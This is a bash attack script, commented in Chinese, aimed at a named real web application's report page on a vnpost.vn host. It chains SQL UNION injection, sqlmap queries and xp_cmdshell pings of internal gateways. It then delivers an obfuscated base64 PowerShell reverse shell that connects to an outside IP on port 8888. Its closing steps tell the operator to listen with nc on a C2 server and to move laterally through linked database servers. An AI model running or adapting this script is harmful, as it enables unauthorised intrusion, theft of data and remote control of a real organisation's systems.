#!/bin/bash

# 不需要登录Cookie，直接用SQL注入（UNION query）
TARGET_BASE="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 通过SQL UNION查询获取内网信息"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# [1] 获取服务器名称
echo ""
echo "[1] 服务器名称..."
curl -sk "${TARGET_BASE}?kyluong=999999'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@SERVERNAME--&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" 2>/dev/null | grep -oP 'qxkpq\K[^q]+(?=qkjxq)' | head -1

# [2] 获取数据库版本和主机名
echo ""
echo "[2] 主机名..."
curl -sk "${TARGET_BASE}?kyluong=999999'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,SERVERPROPERTY('MachineName')--&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" 2>/dev/null | strings | grep -E "[A-Z0-9]{3,}" | head -5

# [3] 列出所有linked servers（可能连接到内网其他数据库）
echo ""
echo "[3] Linked Servers（内网数据库连接）..."
timeout 30 python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --batch --sql-query="SELECT name, data_source FROM sys.servers WHERE is_linked=1" \
    -v 0 2>&1 | grep -A 20 "command standard output\|name\|data_source"

# [4] 查询连接字符串（web.config可能存储在数据库）
echo ""
echo "[4] 搜索连接字符串..."
timeout 30 python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --batch --sql-query="SELECT TOP 5 name FROM sys.databases" \
    -v 0 2>&1 | tee databases_list.txt

# [5] 通过xp_cmdshell ping内网常见网关
echo ""
echo "[5] Ping内网网关..."
for ip in 10.0.0.1 172.16.0.1 192.168.1.1 192.168.0.1; do
    echo "  测试: $ip"
    curl -sk "${TARGET_BASE}?kyluong=112025';EXEC+xp_cmdshell+'ping+-n+1+$ip'--&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" -o "ping_${ip//./_}.html" 2>/dev/null &
    sleep 2
done
wait

echo ""
echo "检查ping结果..."
grep -i "reply\|TTL" ping_*.html 2>/dev/null | head -10

# [6] 直接构造反向shell（通过SQL写入启动项）
echo ""
echo "[6] 尝试写入反向shell到启动目录..."
SHELL_CMD='powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAOAAyAC4AMgA5AC4ANwAxAC4AMQA1ADYAIgAsADgAOAA4ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

timeout 30 python3 /tmp/sqlmap/sqlmap.py \
    -u "${TARGET_BASE}?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP" \
    --batch --os-cmd="$SHELL_CMD" \
    -v 0 2>&1 | tail -20

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 查询完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📊 下一步:"
echo "1. 在C2服务器监听: nc -lvp 8888"
echo "2. 如果反向shell成功，会连接到C2"
echo "3. 或者通过Linked Servers横向移动到其他内网数据库"
